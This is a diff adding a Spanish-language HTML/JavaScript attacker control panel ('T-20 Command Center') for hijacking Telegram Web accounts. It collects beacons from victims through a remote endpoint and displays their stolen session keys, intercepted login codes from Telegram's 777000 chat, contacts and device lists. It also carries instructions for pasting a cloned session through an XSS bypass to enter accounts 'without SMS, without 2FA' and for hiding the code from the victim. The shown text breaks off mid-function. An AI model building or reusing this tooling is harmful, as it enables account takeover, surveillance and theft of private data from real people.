@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="manifest" href="manifest.json">
+<title>T-20 // COMMAND CENTER</title>
+<style>
+:root{
+  --bg1:#14161c; --bg2:#0e0f13;
+  --panel:rgba(42,43,51,.88); --panel2:rgba(37,38,46,.92);
+  --line:rgba(255,255,255,.09); --line2:rgba(255,255,255,.05);
+  --amber:#7d95ad; --blue:#4a90e2; --red:#e05252; --green:#67c46b;
+  --tx:#f2f2f2; --tx2:#a0a0a0; --tx3:#6e6e78;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{
+  font:12px/1.45 system-ui,'Segoe UI',sans-serif;color:var(--tx);
+  background:linear-gradient(180deg,var(--bg1),var(--bg2) 40%);
+  height:100vh;display:flex;flex-direction:column;overflow:hidden;
+}
+body::before{content:'';position:fixed;inset:0 0 auto 0;height:120px;pointer-events:none;
+  background:linear-gradient(90deg,transparent 5%,rgba(125,149,173,.07) 50%,transparent 95%);filter:blur(6px)}
+  
+/* HEADER */
+header{display:flex;align-items:center;gap:14px;padding:0 14px;border-bottom:1px solid var(--line);
+  background:linear-gradient(180deg,rgba(255,255,255,.03),transparent);flex:none;height:44px}
+.brand{display:flex;align-items:baseline;gap:8px}
+.brand b{font-size:15px;letter-spacing:2px;color:var(--amber)}
+.brand span{font-size:10px;color:var(--tx2);letter-spacing:1px}
+.leds{display:flex;gap:16px;margin-left:auto;align-items:center}
+.led{display:flex;align-items:center;gap:6px;font-size:10px;letter-spacing:1px;color:var(--tx2)}
+.dot{width:8px;height:8px;border-radius:50%;background:#555;box-shadow:0 0 6px transparent}
+.dot.on{background:var(--green);box-shadow:0 0 8px var(--green)}
+.dot.err{background:var(--red);box-shadow:0 0 8px var(--red)}
+.dot.amb{background:var(--amber);box-shadow:0 0 8px var(--amber)}
+#clock{font:600 15px/1 ui-monospace,monospace;color:var(--tx);min-width:52px;text-align:right}
+
+/* TOOLBAR */
+nav{display:flex;align-items:center;gap:2px;padding:0 10px;border-bottom:1px solid var(--line);
+  background:rgba(20,22,27,.6);overflow-x:auto;flex:none;height:40px}
+.mod{display:flex;align-items:center;gap:6px;padding:7px 10px;border-radius:6px;cursor:pointer;
+  color:var(--tx2);font-size:11px;white-space:nowrap;border:1px solid transparent}
+.mod svg{width:14px;height:14px;fill:currentColor}
+.mod:hover{color:var(--tx);background:rgba(255,255,255,.04)}
+.mod.sel{color:var(--amber);background:rgba(125,149,173,.08);border-color:rgba(125,149,173,.3)}
+.launch-panel{background:rgba(125,149,173,.10);border:1px solid rgba(125,149,173,.4);color:var(--amber);
+  border-radius:5px;padding:5px 12px;font-size:11px;font-weight:600;letter-spacing:1px;cursor:pointer;
+  display:flex;align-items:center;gap:6px;transition:0.2s;margin-left:auto}
+.launch-panel:hover{background:rgba(125,149,173,.18);transform:translateY(-1px)}
+
+/* LAYOUT MAIN */
+#main{display:flex;flex:1;min-height:0;overflow:hidden}
+
+/* SIDEBAR - TARGETS */
+#tree{width:220px;border-right:1px solid var(--line);background:rgba(24,25,31,.55);display:flex;flex-direction:column;flex:none}
+.ttl{font-size:10px;letter-spacing:2px;color:var(--tx3);padding:10px 12px 4px;font-weight:600}
+#targetList{flex:1;overflow-y:auto;padding:8px}
+.target-card{background:var(--panel2);border:1px solid var(--line);border-radius:6px;padding:10px;margin-bottom:8px;cursor:pointer;transition:.2s}
+.target-card:hover{background:rgba(255,255,255,.05)}
+.target-card.sel{background:rgba(125,149,173,.10);border-color:rgba(125,149,173,.32)}
+.tcard-head{display:flex;align-items:center;gap:8px;margin-bottom:6px}
+.tcard-av{width:28px;height:28px;border-radius:6px;background:var(--panel);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--tx2)}
+.target-card.sel .tcard-av{background:var(--amber);color:#000;border-color:var(--amber)}
+.tcard-nm{font-size:12px;font-weight:600;color:var(--tx);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tcard-ph{font-size:10.5px;color:var(--tx3);font-family:ui-monospace,monospace}
+.tcard-badges{display:flex;gap:4px;margin-top:8px}
+.tbadge{font-size:9px;padding:2px 6px;border-radius:8px;background:rgba(255,255,255,.1);color:var(--tx2)}
+.tbadge.ok{background:rgba(103,196,107,.2);color:var(--green)}
+.tbadge.warn{background:rgba(224,82,82,.2);color:var(--red)}
+
+/* CENTER CONTENT */
+#content{flex:1;display:flex;flex-direction:column;min-width:0;position:relativeoverflow-y:auto;display:flex;flex-direction:column}
+.view{display:flex;flex-direction:column;flex:none}
+.view.sel{display:flex;flex-direction:column}
+.sech{display:flex;align-items:center;gap:10px;padding:8px 14px;background:transparent;border-bottom:1px solid var(--line);border-top:1px solid var(--line);position:sticky;top:0;z-index:5}
+.sech .n{color:#666;font-weight:600;font-size:11px;font-family:ui-monospace,monospace}
+.sech h2{font-size:11.5px;letter-spacing:2px;margin:0;flex:1;color:#9a9a9a;font-weight:600}
+.sech .badge{font-size:10px;font-weight:600;padding:2px 7px;letter-spacing:.5px;flex:none}
+.badge.ok{color:#4dcd5e}
+.badge.na{color:#8a7a5a}
+.no-target-msg{margin:auto;text-align:center;color:var(--tx3);font-size:13px;letter-spacing:1px}
+
+/* VISTA INTERCEPT */
+.intercept-view{padding:14px;overflow-y:auto;display:flex;flex-direction:column;flex:1}
+.step-list{display:flex;flex-direction:column;gap:8px;background:var(--panel2);padding:14px;border-radius:6px;border:1px solid var(--line)}
+.step{display:flex;align-items:center;gap:12px;opacity:0.4;transition:0.3s}
+.step.active{opacity:1}
+.step .icon{width:24px;height:24px;border-radius:50%;background:#333;display:flex;align-items:center;justify-content:center;font-size:12px}
+.step.active .icon{background:var(--amber);color:#000;box-shadow:0 0 8px var(--amber)}
+.step.done .icon{background:var(--green);color:#000}
+.step.critical.done .icon{background:var(--red);color:#fff;box-shadow:0 0 8px var(--red)}
+.step .text{font-size:12px;color:var(--tx)}
+.step .sub{font-size:10px;color:var(--tx3);font-family:ui-monospace,monospace}
+.codebig{font:700 52px/1.1 ui-monospace,monospace;letter-spacing:12px;color:var(--red);text-shadow:0 0 20px rgba(224,82,82,.6);padding:24px 8px;text-align:center;background:#0b0c10;border-radius:8px;border:1px dashed rgba(224,82,82,.3);margin:14px 0}
+.codebig.na{color:var(--tx3);text-shadow:none;letter-spacing:4px;border-color:var(--line)}
+.btn-amber{background:var(--panel2);border:1px solid rgba(125,149,173,.35);color:var(--amber);border-radius:6px;padding:10px 16px;font-size:13px;font-weight:600;cursor:pointer;transition:0.2s}
+.btn-amber:hover{background:rgba(125,149,173,.10)}
+
+/* VISTA CLON TELEGRAM (TG) */
+.tgapp{display:flex;height:auto;min-height:420px;background:#181818;font:14px/1.4 'Helvetica Neue',system-ui,sans-serif}
+.tgside{width:300px;min-width:250px;background:#212121;border-right:1px solid #0a0a0a;display:flex;flex-direction:column}
+.tgstop{padding:10px;border-bottom:1px solid #0a0a0a}
+.tgsearch{background:#2b2b2b;border-radius:16px;height:34px;display:flex;align-items:center;gap:8px;padding:0 12px;color:#888;font-size:13px}
+.tgside-scroll{flex:1;overflow-y:auto;padding:6px}
+.tgsec-title{font-size:15px;font-weight:600;color:#fff;padding:10px 12px 6px}
+.tgcrow{display:flex;gap:10px;padding:6px 8px;border-radius:8px;align-items:center}
+.tgcrow:hover{background:#2b2b2b}
+.tgavatar{width:46px;height:46px;border-radius:50%;flex:none;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:19px}
+.tgcrow .nm{font-weight:600;color:#fff;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tgcrow .st{font-size:12.5px;color:#aaa;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tgmain{flex:1;display:flex;flex-direction:column;min-width:0;background:#0f0f0f}
+.tgmhead{background:#212121;border-bottom:1px solid #0a0a0a;padding:8px 14px;display:flex;align-items:center;gap:12px;min-height:56px}
+.tgmhead .tgnm{font-weight:600;color:#fff;font-size:15px}
+.tgmhead .tgst{font-size:12.5px;color:#aaa}
+.tgbody{flex:1;overflow-y:auto;padding:16px 12px;display:flex;flex-direction:column;gap:8px;
+  background:#0f0f0f;background-image:radial-gradient(rgba(255,255,255,.028) 1px,transparent 1px);background-size:22px 22px}
+.tgsvc{text-align:center;margin:6px 0}
+.tgsvc span{background:rgba(0,0,0,.5);color:#ddd;border-radius:12px;font-size:12.5px;padding:4px 12px}
+.tgsvc.ok span{color:#4dcd5e}
+.tgsvc.warn span{color:#999}
+.tgmsg{max-width:85%;width:fit-content;background:#212121;border-radius:12px 12px 12px 4px;
+  padding:10px 14px 8px;box-shadow:0 1px 2px rgba(0,0,0,.5)}
+.tgmsg .lbl{font-size:11px;font-weight:700;letter-spacing:.6px;color:#8774e1;margin-bottom:6px}
+.tgmsg pre{font:11.5px/1.5 ui-monospace,monospace;background:#0d0d0d;border:1px solid #333;border-radius:8px;
+  padding:8px;white-space:pre-wrap;word-break:break-all;color:#9ecbff}
+.tgmsg .meta{font-size:11px;color:#777;margin-top:6px;display:flex;justify-content:space-between;gap:12px}
+.tgbtns{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
+.tgbtn{background:#3390ec;border:0;color:#fff;border-radius:8px;padding:7px 14px;font-size:13px;font-weight:600;cursor:pointer}
+.tgbtn:hover{filter:brightness(1.12)}
+.tgbtn.sec{background:#2b2b2b;color:#ccc}
+.tgcard{background:#212121;border-radius:10px;padding:12px 16px;max-width:85%}
+.tgcard h5{font-size:13px;font-weight:700;color:#8774e1;margin-bottom:10px}
+.tgrow{display:flex;gap:10px;align-items:center;padding:8px 4px;border-bottom:1px solid rgba(255,255,255,.06)}
+.tgrow:last-child{border:0}
+.tgrow .dev{width:34px;height:34px;border-radius:8px;background:#2b2b2b;flex:none;display:flex;align-items:center;justify-content:center;color:#3390ec}
+.tgrow .dev svg{width:18px;height:18px;fill:currentColor}
+.tgrow .dn{font-weight:600;color:#fff;font-size:13.5px}
+.tgrow .dd{font-size:12px;color:#aaa}
+.tgrow .cur{background:#4dcd5e;color:#000;border-radius:10px;font-size:10.5px;font-weight:700;padding:2px 8px;margin-left:auto}
+
+/* RIGHT SIDEBAR - PERFIL */
+#right{width:280px;border-left:1px solid var(--line);background:rgba(24,25,31,.55);overflow-y:auto;padding:12px;flex:none}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:14px;margin-bottom:12px}
+.panel h4{font-size:10.5px;letter-spacing:2px;color:var(--tx2);font-weight:600;margin-bottom:12px}
+.frow{display:flex;justify-content:space-between;align-items:center;padding:6px 0;font-size:11px;color:var(--tx2);border-bottom:1px solid rgba(255,255,255,.03)}
+.frow:last-child{border:0}
+.frow .vl{color:var(--tx);font-family:ui-monospace,monospace}
+.sw{position:relative;width:34px;height:18px;border-radius:10px;background:#3a3b45;cursor:pointer;transition:.2s;border:1px solid var(--line);flex:none}
+.sw::after{content:'';position:absolute;top:2px;left:2px;width:12px;height:12px;border-radius:50%;background:#888;transition:.2s}
+.sw.on{background:rgba(125,149,173,.3);border-color:var(--amber)}
+.sw.on::after{left:18px;background:var(--amber);box-shadow:0 0 6px rgba(125,149,173,.35)}
+.prow{display:flex;gap:12px;align-items:center;margin-bottom:14px}
+.avatar{width:44px;height:44px;border-radius:8px;background:rgba(125,149,173,.12);border:1px solid rgba(125,149,173,.32);
+  display:flex;align-items:center;justify-content:center;font:700 18px ui-monospace,monospace;color:var(--amber);flex:none}
+.prow .nm{font-size:14px;font-weight:600;color:var(--tx)}
+.prow .us{font-size:11.5px;color:var(--tx2)}
+
+/* FOOTER */
+footer{display:flex;align-items:center;gap:14px;padding:0 12px;border-top:1px solid var(--line);
+  background:rgba(20,22,27,.7);font-size:10px;color:var(--tx3);letter-spacing:1px;flex:none;height:28px}
+footer .sep{color:#2c2d36}
+
+/* MOBILE FIX */
+@media(max-width:850px){
+  #main{flex-direction:column;overflow-y:auto}
+  #tree{width:100%;height:180px;border-right:0;border-bottom:1px solid var(--line);flex:none}
+  #content{flex:none;height:600px;overflow:visible}
+  #right{width:100%;border-left:0;border-top:1px solid var(--line);flex:none;overflow:visible}
+  .tgapp{flex-direction:column}
+  .tgside{width:100%;height:220px;border-right:0;border-bottom:1px solid #0a0a0a;flex:none}
+  .tgmsg{max-width:100%}
+  nav{flex-wrap:wrap;height:auto;padding:8px}
+  .launch-panel{margin-top:8px;width:100%;justify-content:center}
+}
+</style></head><body>
+
+<header>
+  <div class="brand"><b>T-20</b><span>COMMAND CENTER</span></div>
+  <div class="leds"><div class="led"><span class="dot on"></span>C2 LINK</div><div id="clock">--:--</div><div style="font-size:9.5px;color:#666;letter-spacing:1px;margin-left:10px">v13.4</div></div>
+</header>
+
+<nav id="toolbar">
+  <div class="mod sel" style="cursor:default;letter-spacing:1px">OPERACION ACTIVA</div>
+  <button class="launch-panel" id="asklogin">
+    <svg viewBox="0 0 24 24"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg> MINI PANEL LOGIN
+  </button>
+</nav>
+
+<div id="main">
+  <!-- SIDEBAR TARGETS -->
+  <aside id="tree">
+    <div class="ttl">ACTIVE TARGETS</div>
+    <div id="targetList">
+      <div class="no-target-msg" style="margin-top:20px;font-size:11px">Esperando beacons...</div>
+    </div>
+  </aside>
+
+  <!-- CENTER CONTENT -->
+  <section id="content">
+    <div class="no-target-msg" id="selMsg" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;z-index:10;background:var(--bg2)">
+      Seleccioná una víctima a la izquierda para ver su data.
+    </div>
+
+    <!-- ====== SECCION 1: VICTIMA ====== -->
+<div class="sech"><span class="n">01</span><h2>VICTIMA Y PERFIL</h2><span class="badge na" id="secVicBadge">SIN MATERIAL</span><span class="badge na" id="secKeyBadge">SESIÓN —</span></div>
+    <div class="view" id="v-victim">
+      <div style="padding:12px 14px 0 14px"><div class="panel"><div class="panel">
+      <h4>TARGET PROFILE</h4>
+      <div class="prow"><div class="avatar" id="pAv">?</div>
+        <div><div class="nm" id="pNm">--</div><div class="us" id="pUs">--</div></div></div>
+      <div class="frow"><span class="lb">ID</span><span class="vl" id="pId">--</span></div>
+      <div class="frow"><span class="lb">TELÉFONO</span><span class="vl" id="pPhone" style="font-size:14px;font-weight:700">--</span></div>
+      <div class="frow"><span class="lb">SISTEMA</span><span class="vl" id="pOs">--</span></div>
+      <div class="frow"><span class="lb">NAVEGADOR</span><span class="vl" id="pUa">--</span></div>
+      <div class="frow"><span class="lb">CLAVES LOCALS</span><span class="vl" id="pKeys">--</span></div>
+    </div></div></div>
+      <div class="tgapp">
+        <div class="tgside">
+          <div class="tgstop"><div class="tgsearch">Buscar contactos</div></div>
+          <div class="tgside-scroll">
+            <div class="tgsec-title">Contactos <span id="tgCnt" style="color:#888;font-weight:400"></span></div>
+            <div id="tgContacts"></div>
+          </div>
+        </div>
+        <div class="tgmain">
+          <div class="tgmhead">
+            <div class="tgavatar" id="tgHAv" style="width:40px">?</div>
+            <div><div class="tgnm" id="tgHNm">--</div><div class="tgst" id="tgHSt">--</div></div>
+          </div>
+          <div class="tgbody">
+            <div class="tgempty" id="tgEmpty">Sin material exfiltrado todavía.</div>
+            <div class="tgsvc ok" id="tgSvc" hidden><span>SESIÓN CLONADA — material en poder del atacante</span></div>
+            <div class="tgmsg" id="tgKeyMsg" hidden>
+              <div class="lbl" id="tgLbl">LLAVE DE SESION</div>
+              <pre id="tgKeyPre">—</pre>
+              <div class="tgbtns">
+                <button class="tgbtn" id="tgCloneBtn" style="background:#4dcd5e">CLONAR SESION EN MI TELEFONO</button>
+                <button class="tgbtn" id="tgCopyKey">Copiar llave</button>
+                <button class="tgbtn sec" id="tgRestoreBtn">VOLVER A MI CUENTA</button>
+
+              </div>
+              <div class="meta"><span>localStorage · web.telegram.org</span><span id="tgKeyTm"></span></div>
+            </div>
+            <!-- Info Box Oculto -->
+            <div class="tgcard" id="tgInfoBox" hidden style="border:1px solid #4dcd5e;background:#12240f">
+              <h5 style="color:#4dcd5e;margin-bottom:6px">Listo: veneno de clonacion copiado</h5>
+              <p style="font-size:13px;color:#ddd;line-height:1.6">
+                <b>El pegado necesita un editor RICO en el navegador atacante</b> (es el mismo XSS). Dos vehículos válidos:<br><br>
+                <b>(A) Atacante FREE (Prometeus / Chrome) con víctima Abraham:</b> abrí la <b>edición del mensaje rich del bot</b> en el canal lab (bypass E-781), y pegá el clone ahí. Al recargar, Chrome entra en la cuenta de la víctima. Descartá la edición después.<br>
+                <b>(B) Atacante PREMIUM (Abraham / Brave):</b> pegá en <b>Mensajes Guardados</b>. Ojo: la víctima NO puede ser Abraham (te cambiarías a tu misma cuenta y no se nota).<br><br>
+                3. Al pegar, el panel reemplaza solo la sesión WEB de ese navegador por la de la víctima y recarga la página. <b>Ya estás dentro de su cuenta, sin PC, sin SMS, sin 2FA.</b><br><br>
+                <span style="color:#e6b34a;font-size:11.5px">No uses incógnito: te pediría código SMS para loguear otra vez y no aporta nada. Tu sesión queda respaldada (botón Volver a mi cuenta).</span><br>
+                <span style="color:#888;font-size:11.5px">Nota: solo cambia la sesión WEB del navegador atacante; la app del celu no se toca.</span>
+              </p>
+            </div>
+            <div class="tgmsg" id="tgUaMsg" hidden>
+              <div class="lbl">user_auth</div>
+              <pre id="tgUaPre"></pre>
+            </div>
+            <div class="tgcard" id="tgDevCard" hidden>
+              <h5>Dispositivos activos</h5>
+              <div id="tgDevs"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<!-- ====== SECCION 2: CODIGO 777000 ====== -->
+<div class="sech"><span class="n">02</span><h2>INTERCEPTACION DE CODIGO // 777000</h2><span class="badge na" id="secCodeBadge">ESPERANDO</span></div>
+    <div class="view" id="v-messages">
+      <div class="intercept-view">
+        <h2 style="font-size:13px;letter-spacing:1px;margin-bottom:12px">CODE INTERCEPT <span style="color:var(--tx3);font-size:10px">(CHAT 777000)</span></h2>
+        <div class="step-list">
+          <div class="step" id="st1"><div class="icon">1</div><div><div class="text">Esperando ejecución del payload...</div><div class="sub">Víctima debe pegar el texto.</div></div></div>
+          <div class="step" id="st2"><div class="icon">2</div><div><div class="text">Identidad Confirmada</div><div class="sub" id="st2-sub">Esperando...</div></div></div>
+          <div class="step" id="st3"><div class="icon">3</div><div><div class="text">Stealth Mode Activo</div><div class="sub">Ocultando preview del chat 777000 en la víctima.</div></div></div>
+          <div class="step" id="st4"><div class="icon">4</div><div><div class="text">Iniciá el Login en el Mini Panel</div><div class="sub">Usá el número de la víctima y pedí el código.</div></div></div>
+          <div class="step" id="st5"><div class="icon">5</div><div><div class="text">Código Capturado</div><div class="sub">Interceptado desde la última burbuja.</div></div></div>
+        </div>
+        <div class="codebig na" id="codebig">- - - - -</div>
+        <div style="display:flex;justify-content:center"><button class="btn-amber" id="copyCode">COPIAR CÓDIGO</button></div>
+      </div>
+    </div>
+<!-- ====== SECCION 3: ALERTAS Y OPERACION ====== -->
+<div class="sech"><span class="n">03</span><h2>ALERTAS</h2></div>
+    <div class="view" id="v-alerts">
+      <div style="padding:14px;display:flex;flex-direction:column;gap:12px">
+        <div class="panel">
+          <h4>ALERTAS DEL ATACANTE</h4>
+          <div class="frow"><span class="lb">Notificaciones del sistema</span><div class="sw" id="swNot"></div></div>
+          <div class="frow"><span class="lb">Beep en capturas (llave/código)</span><div class="sw on" id="swBeep"></div></div>
+          <button class="tgbtn sec" id="tgPushBtn" style="margin-top:8px">ACTIVAR ALERTAS EN ESTE DISPOSITIVO</button>
+          <div id="tgPushSt" style="color:var(--tx2);font-size:10.5px;margin-top:4px"></div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- RIGHT SIDEBAR PROFILE -->
+  
+</div>
+
+<footer>
+  <span>T-20 COMMAND v13.4</span><span class="sep">|</span>
+  <span>BEACONS <b class="amp" id="ftB">0</b></span><span class="sep">|</span>
+  <span>UPTIME <b id="ftU" style="font-family:ui-monospace,monospace">00:00:00</b></span>
+</footer>
+
+<script>
+/* ESTADO V6 (MULTI-TARGET) */
+const S = {
+  targets: {}, // uid -> data
+  orphans: [],
+  activeUid: null,
+  seen: new Set(),
+  beacons: 0,
+  boot: Date.now(),
+  notifOn: localStorage.getItem('t20v8_notif') === '1',
+  beepOn: localStorage.getItem('t20v8_beep') !== '0'
+};
+let AC = null;
+function beep(f, d) {
+  if (!S.beepOn) return;
+  try {
+    AC = AC || new (window.AudioContext || window.webkitAudioContext)();
+    const o = AC.createOscillator(), g = AC.createGain();
+    o.type = 'sine'; o.frequency.value = f;
+    g.gain.setValueAtTime(.25, AC.currentTime);
+    g.gain.exponentialRampToValueAtTime(.001, AC.currentTime + d);
+    o.connect(g); g.connect(AC.destination);
+    o.start(); o.stop(AC.currentTime + d);
+  } catch(e) {}
+}
+function notify(title, body) {
+  if (!S.notifOn || !('Notification' in window)) return;
+  try { if (Notification.permission === 'granted') new Notification(title, {body}); } catch(e) {}
+}
+const $ = id => document.getElementById(id);
+const STATUS_URL = 'https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Status';
+
+/* UTILS */
+function esc(s){return String(s||'').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}
+function fmtPhone(p){const d=String(p||'').replace(/\D/g,'');return d.startsWith('595')?'+'+d.slice(0,3)+' '+d.slice(3,6)+' '+d.slice(6):'+'+d}
+function uaParse(ua){const m=String(ua||'').match(/(Chrome|Firefox|Safari|Edg)\/(\d+)/);const os=/Windows/.test(ua)?'Windows':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':/Linux/.test(ua)?'Linux':/Mac/.test(ua)?'macOS':'?';return (m?m[1]+' '+m[2]:'?')+' · '+os}
+const TGPALETTE=[['#ff885e','#ff516a'],['#ffcd6a','#ffa85c'],['#82b1ff','#665fff'],['#a0de7e','#54cb68'],['#53edd6','#28c9b7'],['#72d5fd','#2a9ef1']];
+function tgGrad(name){let h=0;for(const c of String(name))h=(h*31+c.charCodeAt(0))>>>0;const g=TGPALETTE[h%TGPALETTE.length];return 'linear-gradient(180deg,'+g[0]+','+g[1]+')'}
+function tgInitials(n){const p=String(n||'?').trim().split(/\s+/);return ((p[0]||'?')[0]+(p[1]?' '+p[1][0]:'')).toUpperCase()}
+function tgTime(t){try{const d=new Date(String(t||'').replace(/(\.\d{3})\d+/,'$1'));if(!isNaN(d))return d.toLocaleTimeString('es-PY',{hour:'2-digit',minute:'2-digit'})}catch(e){}return '--:--'}
+
+/* PROCESAMIENTO BEACONS */
+function processBeacon(b) {
+  if (S.seen.has(b.id)) return false;
+  S.seen.add(b.id);
+  S.beacons++;
+  
+  // Extraer UID o Phone como identificador del target
+  let uid = '';
+  const uam = String(b.ua||'').match(/uid:(\d+)/);
+  if (uam) uid = uam[1];
+  if (!uid) {
+    const extm = String(b.extra||'').match(/^uid:(\d+)/);
+    if (extm) uid = extm[1];
+  }
+  if (!uid && b.marker === 'T36-KEY') {
+    // la llave misma trae la identidad dentro de user_auth
+    try { uid = String(JSON.parse(JSON.parse(b.extra).user_auth).id || ''); } catch(e) {
+      try { uid = String((JSON.parse(b.extra).user_auth||{}).id || ''); } catch(e2) {}
+    }
+  }
+  // fusión: si ya existe un target por teléfono de esta misma persona, unificar bajo uid
+  if (uid && b.phone && S.targets[b.phone] && !S.targets[uid]) {
+    const old = S.targets[b.phone];
+    old.uid = uid;
+    S.targets[uid] = old;
+    delete S.targets[b.phone];
+  }
+  if (!uid && !b.phone) {
+    // sin identidad: se guarda como huerfano y se re-procesa cuando aparezca el target
+    const ks = Object.keys(S.targets);
+    if (ks.length === 1) uid = ks[0];
+    if (!uid) { S.orphans = S.orphans || []; if (S.orphans.length < 40) S.orphans.push(b); return false; }
+  }
+  if (!uid) uid = b.phone;
+  const nuevoTarget = !S.targets[uid];
+  
+  if (!S.targets[uid]) {
+    S.targets[uid] = { uid, phone:'', vname:'', username:'', osys:'', ua:'', code:'', key:null, keyAt:'', contacts:null, sessions:null, stealth:false, id_seen:false, recon:false, ids:[] };
+  }
+  S.targets[uid].ids.push(b.id);
+  const T = S.targets[uid];
+  if (nuevoTarget && S.orphans && S.orphans.length) {
+    const pend = S.orphans; S.orphans = [];
+    pend.forEach((ob, i) => setTimeout(() => { S.seen.delete(ob.id); processBeacon(ob); renderAll(); }, i * 40));
+  }
+  
+  // Actualizar perfil base
+  if (b.phone) T.phone = b.phone;
+  if (b.vname && b.vname!=='Desconocido') T.vname = b.vname;
+  if (b.username) T.username = b.username;
+  if (b.osys) T.osys = b.osys;
+  if (b.ua) T.ua = b.ua;
+  if (b.dc2_present !== undefined) T.keys = `dc2:${b.dc2_present?'SI':'no'} dc3:${b.dc3_present?'SI':'no'}`;
+  
+  // Parsear Markers
+  const m = b.marker || '';
+  if (m.startsWith('T36-RECON')) T.recon = true;
+  if (m.startsWith('T36-ID')) T.id_seen = true;
+  if (m.startsWith('T36-STEALTH')) T.stealth = true;
+  if (m.startsWith('T36-CODE:')) {
+    T.code = m.split(':')[1];
+    beep(660, .25); setTimeout(() => beep(660, .25), 200); setTimeout(() => beep(990, .5), 400);
+    notify('T-20 · CÓDIGO INTERCEPTADO', 'Código: ' + T.code + ' — copialo y entrá.');
+  }
+  
+  if (m === 'T36-KEY') {
+    try { T.key = JSON.parse(b.extra); T.keyAt = b.created_date; } catch(e){}
+    beep(880, .35); setTimeout(() => beep(1120, .35), 180);
+    notify('T-20 // LLAVE CAPTURADA', (T.vname || 'Victima') + ' - CLONAR en la consola.');
+  }
+  if (m === 'T36-CONTACTS') {
+    try { T.contacts = JSON.parse(b.extra); } catch(e){}
+  }
+  if (m === 'T36-AUTHS') {
+    try { T.sessions = JSON.parse(b.extra).sessions; } catch(e){}
+  }
+  
+  return true;
+}
+
+/* RENDERIZADO GLOBAL */
+function renderAll() {
+  const tlist = $('targetList');
+  tlist.innerHTML = '';
+  let any = false;
+  
+  for (const uid in S.targets) {
+    const T = S.targets[uid];
+    if (!T.id_seen && !T.key && !T.code && !T.contacts && !T.phone) continue;
+    any = true;
+    const nm = T.vname || (T.phone ? 'Victima' : 'Sin identificar');
+    const ph = T.phone ? fmtPhone(T.phone) : ''
+    
+    let badges = '';
+    if (T.key) badges += '<span class="tbadge ok">SESIÓN KEY</span>';
+    else if (T.stealth) badges += '<span class="tbadge">STEALTH</span>';
+    if (T.code) badges += '<span class="tbadge warn">CÓDIGO '+T.code+'</span>';
+    
+    const card = document.createElement('div');
+    card.className = 'target-card' + (S.activeUid === uid ? ' sel' : '');
+    card.innerHTML = `
+      <div class="tcard-head">
+        <div class="tcard-av">${tgInitials(nm)[0]}</div>
+        <div style="min-width:0">
+          <div class="tcard-nm">${esc(nm)}</div>
+          <div class="tcard-ph">${esc(ph)}</div>
+        </div>
+      </div>
+      ${badges ? `<div class="tcard-badges">${badges}</div>` : ''}
+    `;
+    card.onclick = () => { S.activeUid = uid; renderAll(); };
+    const del = document.createElement('div');
+    del.textContent = 'X';
+    del.title = 'Eliminar victima';
+    del.style.cssText = 'position:absolute;top:6px;right:8px;color:#555;font-size:11px;cursor:pointer;padding:3px 5px';
+    card.style.position = 'relative';
+    del.onclick = (ev) => { ev.stopPropagation(); eliminarVictima(uid); };
+    card.appendChild(del);
+    tlist.appendChild(card);
+  }
+  
+  if (!any) {
+    tlist.innerHTML = '<div class="no-target-msg" style="margin-top:20px;font-size:11px">Esperando beacons...</div>';
+  }
+  const hdr = tlist.parentElement.querySelector('.h');
+  if (hdr && !hdr.querySelector('.vaciar')) {
+    const v = document.createElement('span');
+    v.className = 'vaciar';
+    v.textContent = 'VACIAR';
+    v.style.cssText = 'float:right;color:#555;font-size:9.5px;letter-spacing:1px;cursor:pointer;padding:2px 5px';
+    v.onclick = vaciarTodo;
+    hdr.appendChild(v);
+  }
+  
+  $('ftB').textContent = S.beacons;
+  
+  // Render Target Específico
+  if (S.activeUid && S.targets[S.activeUid]) {
+    $('selMsg').style.display = 'none';
+    renderTargetProfile(S.targets[S.activeUid]);
+    renderIntercept(S.targets[S.activeUid]);
+    renderTG(S.targets[S.activeUid]);
+  } else {
+    $('selMsg').style.display = 'flex';
+  }
+}
+
+function renderTargetProfile(T) {
+  const nm = T.vname || 'VÍCTIMA';
+  $('pAv').textContent = tgInitials(nm)[0];
+  $('pNm').textContent = nm;
+  $('pUs').textContent = T.username ? '@'+T.username : 'sin @username';
+  $('pId').textContent = T.uid || '--';
+  $('pPhone').textContent = T.phone ? fmtPhone(T.phone) : '--';
+  $('pOs').textContent = T.osys || '--';
+  $('pUa').textContent = uaParse(T.ua);
+  $('pKeys').textContent = T.keys || '--';
+}
+
+function renderIntercept(T) {
+  const setStep = (id, state, text) => {
+    $(id).className = 'step ' + state;
+    if(text) $(id+'-sub').textContent = text;
+  };
+  
+  setStep('st1', T.recon || T.id_seen ? 'done' : 'active');
+  setStep('st2', T.id_seen ? 'done' : (T.recon ? 'active' : ''), T.id_seen ? ('Identidad: ' + (T.vname||T.phone||T.uid)) : 'Esperando ID...');
+  setStep('st3', T.stealth ? 'done' : (T.id_seen ? 'active' : ''));
+  setStep('st4', (T.id_seen && !T.code) ? 'active' : (T.code ? 'done' : ''));
+  setStep('st5', T.code ? 'done critical' : '');
+  
+  const cb = $('codebig');
+  if (T.code) { cb.className = 'codebig'; cb.textContent = T.code; }
+  else { cb.className = 'codebig na'; cb.textContent = '- - - - -'; }
+}
+
+function renderTG(T) {
+  const nm = T.vname || 'Víctima';
